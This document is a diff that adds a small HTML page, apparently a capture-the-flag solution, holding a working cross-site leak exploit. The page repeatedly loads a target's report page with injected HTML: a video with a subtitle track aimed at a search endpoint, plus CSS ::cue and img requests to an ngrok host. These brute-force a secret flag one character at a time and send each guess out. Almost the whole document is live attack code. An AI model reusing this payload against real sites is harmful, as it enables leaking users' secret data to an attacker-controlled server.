@@ -1,0 +1,19 @@
+<html>
+	<head>
+		<title>HAHA</title>
+	</head>
+	<body>
+		<script>
+			let x = window.open('http://localhost:8000','wof')
+			const alphabet = "abcdefghijklmnopqrstuvwxyz_"
+			let payload = `http://localhost:8000/report?noteid="><video id="video" controls autoplay muted><source src="http://639f-91-239-206-213.ngrok.io/video" type="video/mp4"><track label="English" kind="subtitles" srclang="en" src="%2Fsearch%3Fsearch%3DPAYLOAD%26msg%3DWEBVTT%250a00%3A00.000%2520--%3E%252000%3A04.000%250a%2520-%2520" default> </video><style>::cue {background-image:url('http://639f-91-239-206-213.ngrok.io/hit?wow=PAYLOAD')}</style><img src="http://639f-91-239-206-213.ngrok.io/hit?wow2=PAYLOAD">`
+			let leaked = "ASIS{i_thi"
+
+			i = 0
+			setInterval(()=>{
+				g = encodeURIComponent(leaked+alphabet[i++])
+				x.location = payload.replace(/PAYLOAD/g,g)
+			},1200)
+		</script>
+	</body>
+</html>
